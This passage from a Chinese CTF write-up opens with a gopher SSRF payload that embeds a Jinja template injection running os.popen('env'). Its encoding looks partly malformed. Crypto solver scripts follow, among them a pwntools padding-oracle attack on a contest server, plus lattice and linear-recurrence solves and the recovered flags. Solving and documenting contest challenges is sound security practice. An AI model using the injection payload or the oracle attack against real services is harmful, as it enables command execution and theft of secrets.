<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=gopher%3A%2F%2F127.0.0.1%3A5001%2F_POST%2520%2F%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%253A5001%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%250D%250A%250D%250A%250D%250A%250D%250A%250D%250Atemplate%253D%257B%257B%2520url_for._globals_%255B%2527_%255D%255B%2527%255D%2527%255D%2527%255D%2527%255D%2527%255D%2527%2527%2527%2522%2522os%2522%2529.popen%2528%2522env%2522%2529.read%2528%2529%2527%2529%2520%2527%257D%257D%255D%2527</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="73.png" alt="73"></p>
<h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="共轭迷宫"><a href="#共轭迷宫" class="headerlink" title="共轭迷宫"></a>共轭迷宫</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from decimal import Decimal, getcontext</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 设置高精度计算环境</span><br><span class="line">    getcontext().prec = 100  # 提高精度到100位</span><br><span class="line">    </span><br><span class="line">    # 公开的范数平方</span><br><span class="line">    norm_squared = Decimal(&#x27;15960922284361974605582033637987025644912788&#x27;)</span><br><span class="line">    </span><br><span class="line">    # 计算范数</span><br><span class="line">    norm_G = norm_squared.sqrt()</span><br><span class="line">    </span><br><span class="line">    # 共享密钥 K_Alice 的分量（即归一化后的 g）</span><br><span class="line">    K_Alice_str = &quot;0.47292225874042030771896799291807799271678994351844+0.44018598307489329918958641928841974350737975182974i+0.54174915328248053441099670537355485876445440400706j+0.53766968708489053913141352127029842443636489064268k&quot;</span><br><span class="line">    </span><br><span class="line">    # 使用正则表达式安全解析四元数</span><br><span class="line">    pattern = r&#x27;([+-]?\d+\.\d+)[ij]?&#x27;  # 匹配浮点数部分</span><br><span class="line">    parts = re.findall(pattern, K_Alice_str)</span><br><span class="line">    </span><br><span class="line">    if len(parts) &lt; 4:</span><br><span class="line">        # 硬编码分量作为备选方案</span><br><span class="line">        w_g = Decimal(&#x27;0.47292225874042030771896799291807799271678994351844&#x27;)</span><br><span class="line">        x_g = Decimal(&#x27;0.44018598307489329918958641928841974350737975182974&#x27;)</span><br><span class="line">        y_g = Decimal(&#x27;0.54174915328248053441099670537355485876445440400706&#x27;)</span><br><span class="line">        z_g = Decimal(&#x27;0.53766968708489053913141352127029842443636489064268&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        w_g = Decimal(parts[0])</span><br><span class="line">        x_g = Decimal(parts[1])</span><br><span class="line">        y_g = Decimal(parts[2])</span><br><span class="line">        z_g = Decimal(parts[3])</span><br><span class="line">    </span><br><span class="line">    # 计算原始整数分量</span><br><span class="line">    w = int(round(w_g * norm_G))</span><br><span class="line">    x = int(round(x_g * norm_G))</span><br><span class="line">    y = int(round(y_g * norm_G))</span><br><span class="line">    z = int(round(z_g * norm_G))</span><br><span class="line">    </span><br><span class="line">    # 验证后六位是否匹配</span><br><span class="line">    expected_suffixes = [271603, 292847, 939167, 994109]</span><br><span class="line">    calculated_suffixes = [w % 1000000, x % 1000000, y % 1000000, z % 1000000]</span><br><span class="line">    </span><br><span class="line">    if calculated_suffixes != expected_suffixes:</span><br><span class="line">        print(&quot;警告：计算的分量后六位不匹配！&quot;)</span><br><span class="line">        print(f&quot;计算值：&#123;calculated_suffixes&#125;&quot;)</span><br><span class="line">        print(f&quot;期望值：&#123;expected_suffixes&#125;&quot;)</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    # 将每个整数转换为 9 字节（大端序），然后拼接为 flag</span><br><span class="line">    try:</span><br><span class="line">        w_bytes = w.to_bytes(9, &#x27;big&#x27;)</span><br><span class="line">        x_bytes = x.to_bytes(9, &#x27;big&#x27;)</span><br><span class="line">        y_bytes = y.to_bytes(9, &#x27;big&#x27;)</span><br><span class="line">        z_bytes = z.to_bytes(9, &#x27;big&#x27;)</span><br><span class="line">    except OverflowError:</span><br><span class="line">        # 处理可能的溢出错误</span><br><span class="line">        w_bytes = w.to_bytes(10, &#x27;big&#x27;)[:9]  # 取前9字节</span><br><span class="line">        x_bytes = x.to_bytes(10, &#x27;big&#x27;)[:9]</span><br><span class="line">        y_bytes = y.to_bytes(10, &#x27;big&#x27;)[:9]</span><br><span class="line">        z_bytes = z.to_bytes(10, &#x27;big&#x27;)[:9]</span><br><span class="line">    </span><br><span class="line">    flag = w_bytes + x_bytes + y_bytes + z_bytes</span><br><span class="line">    print(flag.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;))  # 输出 flag</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line">flag&#123;hav3_U_f1nd_ouT_@bout_tr1ck?XD&#125;</span><br></pre></td></tr></table></figure>



<h3 id="天虫的秘密"><a href="#天虫的秘密" class="headerlink" title="天虫的秘密"></a>天虫的秘密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def padding_oracle_attack():</span><br><span class="line">    # 连接到服务器</span><br><span class="line">    r = remote(&quot;8.147.132.32&quot;, 40772)  # 替换为实际地址和端口</span><br><span class="line">    </span><br><span class="line">    # 接收初始数据</span><br><span class="line">    initial_b64 = r.recvline().strip()[2:-1].decode().strip()</span><br><span class="line">    print(f&quot;Received initial data: &#123;initial_b64&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 解码初始数据</span><br><span class="line">    decoded = base64.b64decode(initial_b64)</span><br><span class="line">    iv = decoded[:16]</span><br><span class="line">    ct_blocks = [decoded[i:i+16] for i in range(16, len(decoded), 16)]</span><br><span class="line">    </span><br><span class="line">    flag = b&quot;&quot;</span><br><span class="line">    </span><br><span class="line">    # 对每个密文块进行解密</span><br><span class="line">    for block_num in range(len(ct_blocks)):</span><br><span class="line">        print(f&quot;\nDecrypting block &#123;block_num+1&#125;/&#123;len(ct_blocks)&#125;&quot;)</span><br><span class="line">        current_ct = ct_blocks[block_num]</span><br><span class="line">        prev_ct = iv if block_num == 0 else ct_blocks[block_num-1]</span><br><span class="line">        </span><br><span class="line">        decrypted = bytearray(16)</span><br><span class="line">        </span><br><span class="line">        for byte_pos in range(15, -1, -1):</span><br><span class="line">            # 准备篡改的prev_ct</span><br><span class="line">            tampered_prev = bytearray(prev_ct)</span><br><span class="line">            </span><br><span class="line">            # 设置后面的字节使得padding正确</span><br><span class="line">            padding_value = 16 - byte_pos</span><br><span class="line">            for k in range(byte_pos + 1, 16):</span><br><span class="line">                tampered_prev[k] = decrypted[k] ^ padding_value</span><br><span class="line">            </span><br><span class="line">            # 暴力破解当前字节</span><br><span class="line">            for guess in range(256):</span><br><span class="line">                tampered_prev[byte_pos] = guess</span><br><span class="line">                </span><br><span class="line">                # 构建测试数据</span><br><span class="line">                test_data = bytes(tampered_prev) + current_ct</span><br><span class="line">                test_b64 = base64.b64encode(test_data)</span><br><span class="line">                </span><br><span class="line">                # 发送给oracle</span><br><span class="line">                r.sendlineafter(b&quot;base64(iv+ct)\n&quot;, test_b64)</span><br><span class="line">                response = r.recvline().strip()[2:-1].decode()[:-2].encode()</span><br><span class="line">                </span><br><span class="line">                if response == b&#x27;OK&#x27;:</span><br><span class="line">                    # 找到正确的值</span><br><span class="line">                    decrypted[byte_pos] = guess ^ padding_value</span><br><span class="line">                    print(f&quot;Byte &#123;byte_pos&#125;: &#123;hex(decrypted[byte_pos])&#125;&quot;)</span><br><span class="line">                    break</span><br><span class="line">                elif response != b&#x27;ERR2&#x27;:</span><br><span class="line">                    print(f&quot;Unexpected response: &#123;response&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        # 计算明文块</span><br><span class="line">        plaintext_block = bytes([decrypted[i] ^ prev_ct[i] for i in range(16)])</span><br><span class="line">        flag += plaintext_block</span><br><span class="line">        print(f&quot;Current flag: &#123;flag&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 去除可能的padding</span><br><span class="line">    try:</span><br><span class="line">        from Crypto.Util.Padding import unpad</span><br><span class="line">        flag = unpad(flag, 16)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">    print(f&quot;\nFinal flag: &#123;flag.decode()&#125;&quot;)</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line">padding_oracle_attack()</span><br></pre></td></tr></table></figure>



<h3 id="三重密钥锁"><a href="#三重密钥锁" class="headerlink" title="三重密钥锁"></a>三重密钥锁</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line"># 给定参数</span><br><span class="line">p = 10424356578148041779853991789187969944186570125402901113699573185144158488847151089093649435805832723680640302469301322004769382556869280204369016044400623</span><br><span class="line">k = 2016425917343526209264752974016973527106088400191647819396444997081866888816818440804306653900752825844532111319244334210470353279795203950886189568717273</span><br><span class="line">m = 9640575609666038466312358795458735166723157003124018050805657432015561577987823522956739610343817276374800232163184447140344754253531140765054930193240661</span><br><span class="line">n = 8539207304708818916453730202381072788689351891251165656488809155919585187699733568697903825636944248694317545906020707873051567183468920809837554174735591</span><br><span class="line">f = 3760813688323379339493776734416231127517302841171887658445242754803946122769018586447782634756726656702581791734772105099204609201876825961922712387326893</span><br><span class="line"></span><br><span class="line"># 使用改进的格基构造方法</span><br><span class="line">C = 2^128  # 放大因子</span><br><span class="line">M = 2^300  # 用于平衡方程的常数项</span><br><span class="line"></span><br><span class="line"># 构造格基矩阵</span><br><span class="line">L = matrix(ZZ, [</span><br><span class="line">    [1, 0, 0, 0, k * M],</span><br><span class="line">    [0, 1, 0, 0, m * M],</span><br><span class="line">    [0, 0, 1, 0, n * M],</span><br><span class="line">    [0, 0, 0, 1, -p * M],</span><br><span class="line">    [0, 0, 0, 0, -f * M]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"># 对格进行LLL规约</span><br><span class="line">L_LLL = L.LLL()</span><br><span class="line"></span><br><span class="line">print(&quot;LLL规约后的基矩阵:&quot;)</span><br><span class="line">print(L_LLL)</span><br><span class="line"></span><br><span class="line"># 在规约后的基中寻找短向量</span><br><span class="line">for i in range(L_LLL.nrows()):</span><br><span class="line">    v = L_LLL[i]</span><br><span class="line">    # 检查向量是否满足条件：前四个分量小，最后一个分量接近0</span><br><span class="line">    if all(abs(v[j]) &lt; 2^128 for j in range(4)) and abs(v[4]) &lt; 1:</span><br><span class="line">        a, b, c, t, w = v</span><br><span class="line">        # 验证方程</span><br><span class="line">        S = (k * a + m * b + n * c) % p</span><br><span class="line">        if S == f:</span><br><span class="line">            print(&quot;找到正确解!&quot;)</span><br><span class="line">            print(f&quot;a = &#123;a&#125;&quot;)</span><br><span class="line">            print(f&quot;b = &#123;b&#125;&quot;)</span><br><span class="line">            print(f&quot;c = &#123;c&#125;&quot;)</span><br><span class="line">            # 转换为字节</span><br><span class="line">            a_bytes = long_to_bytes(abs(a))</span><br><span class="line">            b_bytes = long_to_bytes(abs(b))</span><br><span class="line">            c_bytes = long_to_bytes(abs(c))</span><br><span class="line">            flag = a_bytes + b_bytes + c_bytes</span><br><span class="line">            try:</span><br><span class="line">                print(&quot;Flag:&quot;, flag.decode())</span><br><span class="line">            except:</span><br><span class="line">                print(&quot;Flag字节序列:&quot;, flag)</span><br><span class="line">            break</span><br><span class="line">else:</span><br><span class="line">    print(&quot;未找到有效解，尝试其他方法...&quot;)</span><br><span class="line">    </span><br><span class="line">    # 备选方案：直接使用方程求解</span><br><span class="line">    print(&quot;\n尝试直接求解方程...&quot;)</span><br><span class="line">    # 创建整数环</span><br><span class="line">    R = Integers(p)</span><br><span class="line">    # 将系数转换为环元素</span><br><span class="line">    k_r = R(k)</span><br><span class="line">    m_r = R(m)</span><br><span class="line">    n_r = R(n)</span><br><span class="line">    f_r = R(f)</span><br><span class="line">    </span><br><span class="line">    # 尝试小范围搜索</span><br><span class="line">    print(&quot;在小范围搜索可能解...&quot;)</span><br><span class="line">    found = False</span><br><span class="line">    for a_val in range(-10000, 10000):</span><br><span class="line">        for b_val in range(-10000, 10000):</span><br><span class="line">            # 计算c值</span><br><span class="line">            c_val = (f_r - k_r*a_val - m_r*b_val)/n_r</span><br><span class="line">            if c_val in ZZ and abs(c_val) &lt; 2^128:</span><br><span class="line">                c_val = int(c_val)</span><br><span class="line">                # 验证</span><br><span class="line">                if (k*a_val + m*b_val + n*c_val) % p == f:</span><br><span class="line">                    print(&quot;找到可能解:&quot;)</span><br><span class="line">                    print(f&quot;a = &#123;a_val&#125;, b = &#123;b_val&#125;, c = &#123;c_val&#125;&quot;)</span><br><span class="line">                    # 转换为字节</span><br><span class="line">                    a_bytes = long_to_bytes(abs(a_val))</span><br><span class="line">                    b_bytes = long_to_bytes(abs(b_val))</span><br><span class="line">                    c_bytes = long_to_bytes(abs(c_val))</span><br><span class="line">                    flag = a_bytes + b_bytes + c_bytes</span><br><span class="line">                    try:</span><br><span class="line">                        print(&quot;Flag:&quot;, flag.decode())</span><br><span class="line">                    except:</span><br><span class="line">                        print(&quot;Flag字节序列:&quot;, flag)</span><br><span class="line">                    found = True</span><br><span class="line">                    break</span><br><span class="line">        if found:</span><br><span class="line">            break</span><br><span class="line">    if not found:</span><br><span class="line">        print(&quot;小范围搜索未找到解，可能需要更高级的方法。&quot;)</span><br></pre></td></tr></table></figure>

<p>找到正确解!<br>a &#x3D; 8114814712000897552318176780132<br>b &#x3D; 3817874022844315390187606603568<br>c &#x3D; 594120294386003970492896945755088253<br>Flag: flag{op3n_A_d007_t0_th3_w0rld_0f_latt1ce}</p>
<h3 id="随机数之旅4"><a href="#随机数之旅4" class="headerlink" title="随机数之旅4"></a>随机数之旅4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">recover_linrec.py</span><br><span class="line">还原线性递推生成的片段并重建 flag（模 p 的线性方程组求解）</span><br><span class="line">适用于题目：长度 L=14 的线性递推，给定连续 2L 个 x 值</span><br><span class="line"></span><br><span class="line">用法：直接运行即可，脚本内含示例数据（替换为你的数据）</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from typing import List</span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line"># --------- 请在此填入题目给出的 p 和连续 2L 个 x 值 ----------</span><br><span class="line">p = 3028255493  # 示例：题目给出的素数 p</span><br><span class="line"># 这是你贴出的最后 28 个 x 值（就是示例）</span><br><span class="line">x_vals = [</span><br><span class="line">2981540507, 1806477191, 1912594455, 2801509477, 401085215, 818458584,</span><br><span class="line">2397034605, 2120401989, 2008340439, 66147874, 1558789534, 2187085801,</span><br><span class="line">671267991, 2930313508, 924435370, 902711250, 1226810076, 769329795,</span><br><span class="line">2328739529, 1228810265, 1382003520, 1967489557, 2811050420, 1008248532,</span><br><span class="line">1643249997, 639108823, 449982542, 1325050025</span><br><span class="line">]</span><br><span class="line"># ----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"># L is the recurrence length</span><br><span class="line">L = len(x_vals) // 2</span><br><span class="line">assert L * 2 == len(x_vals), &quot;需要 2L 个连续 x 值&quot;</span><br><span class="line"></span><br><span class="line"># Build linear system: for i in 0..L-1:</span><br><span class="line"># sum_&#123;j=0..L-1&#125; c[j] * x[i+j] ≡ x[L+i] (mod p)</span><br><span class="line">A = [[0]*L for _ in range(L)]</span><br><span class="line">b = [0]*L</span><br><span class="line">for i in range(L):</span><br><span class="line">    for j in range(L):</span><br><span class="line">        A[i][j] = x_vals[i+j] % p</span><br><span class="line">    b[i] = x_vals[L + i] % p</span><br><span class="line"></span><br><span class="line"># modular Gaussian elimination to solve A * c = b (mod p)</span><br><span class="line">def modinv(a, mod):</span><br><span class="line">    return pow(a, -1, mod)</span><br><span class="line"></span><br><span class="line">def solve_mod_linear_system(A: List[List[int]], b: List[int], mod: int) -&gt; List[int]:</span><br><span class="line">    n = len(A)</span><br><span class="line">    # make augmented matrix</span><br><span class="line">    M = [row[:] + [bval] for row, bval in zip(A, b)]</span><br><span class="line">    # elimination</span><br><span class="line">    row = 0</span><br><span class="line">    for col in range(n):</span><br><span class="line">        # find pivot</span><br><span class="line">        pivot = -1</span><br><span class="line">        for r in range(row, n):</span><br><span class="line">            if M[r][col] % mod != 0:</span><br><span class="line">                pivot = r</span><br><span class="line">                break</span><br><span class="line">        if pivot == -1:</span><br><span class="line">            continue</span><br><span class="line">        # swap</span><br><span class="line">        M[row], M[pivot] = M[pivot], M[row]</span><br><span class="line">        inv_pivot = modinv(M[row][col] % mod, mod)</span><br><span class="line">        # normalize</span><br><span class="line">        M[row] = [(val * inv_pivot) % mod for val in M[row]]</span><br><span class="line">        # eliminate other rows</span><br><span class="line">        for r in range(n):</span><br><span class="line">            if r != row:</span><br><span class="line">                factor = M[r][col] % mod</span><br><span class="line">                if factor:</span><br><span class="line">                    M[r] = [ (M[r][k] - factor * M[row][k]) % mod for k in range(n+1) ]</span><br><span class="line">        row += 1</span><br><span class="line">        if row == n:</span><br><span class="line">            break</span><br><span class="line">    # read solution (assuming full rank)</span><br><span class="line">    sol = [0]*n</span><br><span class="line">    for i in range(n):</span><br><span class="line">        # find leading 1</span><br><span class="line">        lead = -1</span><br><span class="line">        for j in range(n):</span><br><span class="line">            if M[i][j] == 1:</span><br><span class="line">                lead = j</span><br><span class="line">                break</span><br><span class="line">        if lead == -1:</span><br><span class="line">            continue</span><br><span class="line">        sol[lead] = M[i][-1] % mod</span><br><span class="line">    return sol</span><br><span class="line"></span><br><span class="line">c = solve_mod_linear_system(A, b, p)</span><br><span class="line">print(&quot;Recovered coefficients c (mod p):&quot;)</span><br><span class="line">for i,ci in enumerate(c):</span><br><span class="line">    print(i, ci)</span><br><span class="line"></span><br><span class="line"># Convert coefficients back to bytes</span><br><span class="line"># In original generator each piece is up to 3 bytes (they did pieces=[flag[i:i+3]])</span><br><span class="line"># So for each coefficient try to convert to 3-byte big-endian</span><br><span class="line">pieces = []</span><br><span class="line">for ci in c:</span><br><span class="line">    # decide length: try 3 bytes first, if leading bytes zero, we can strip</span><br><span class="line">    # but keep 3 bytes to preserve structure</span><br><span class="line">    blen = max(3, (ci.bit_length() + 7) // 8)</span><br><span class="line">    # we expect up to 3 bytes, but guard if &gt;3</span><br><span class="line">    if blen &gt; 3:</span><br><span class="line">        blen = (ci.bit_length() + 7) // 8</span><br><span class="line">    try:</span><br><span class="line">        pb = ci.to_bytes(blen, &#x27;big&#x27;)</span><br><span class="line">    except OverflowError:</span><br><span class="line">        pb = b&#x27;&#x27;</span><br><span class="line">    pieces.append(pb)</span><br><span class="line"></span><br><span class="line"># join and try decode</span><br><span class="line">flag_bytes = b&#x27;&#x27;.join(pieces)</span><br><span class="line"># Try to decode ascii and find &quot;flag&#123;&quot;</span><br><span class="line">try:</span><br><span class="line">    s = flag_bytes.decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;)</span><br><span class="line">except:</span><br><span class="line">    s = None</span><br><span class="line"></span><br><span class="line">print(&quot;\nJoined bytes (hex):&quot;, flag_bytes.hex())</span><br><span class="line">print(&quot;Joined bytes (raw repr):&quot;, flag_bytes)</span><br><span class="line">print(&quot;Joined decoded (ascii, ignore errors):&quot;)</span><br><span class="line">print(s)</span><br><span class="line"># heuristics: find substring like flag&#123;...&#125;</span><br><span class="line">if s and &quot;flag&#123;&quot; in s:</span><br><span class="line">    start = s.find(&quot;flag&#123;&quot;)</span><br><span class="line">    end = s.find(&quot;&#125;&quot;, start)</span><br><span class="line">    if end != -1:</span><br><span class="line">        print(&quot;\nFound flag-like substring:&quot;, s[start:end+1])</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;\nFound &#x27;flag&#123;&#x27;, but no closing brace in decoded string&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;\nNo obvious &#x27;flag&#123;&#x27; found in decoded bytes. You can inspect hex above.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是一个长度为 14 的线性递推：对于所有 n ≥ 14，x[n] ≡ Σ_{j&#x3D;0..13} c[j] * x[n-14+j] (mod p)。</p>
<p>利用你给出的 28 个连续输出，可以凑出 14 个方程，模 p 解线性方程组得到 c（每个 c 就是一个 3 字节片段的整数表示），把每个 c 转回 bytes 并拼接即可得到 flag。</p>
<p>我直接还原出来的 flag 是：</p>
<p>flag{188a9250-bd02-4746-8ddd-a32d9c1bb11a}</p>
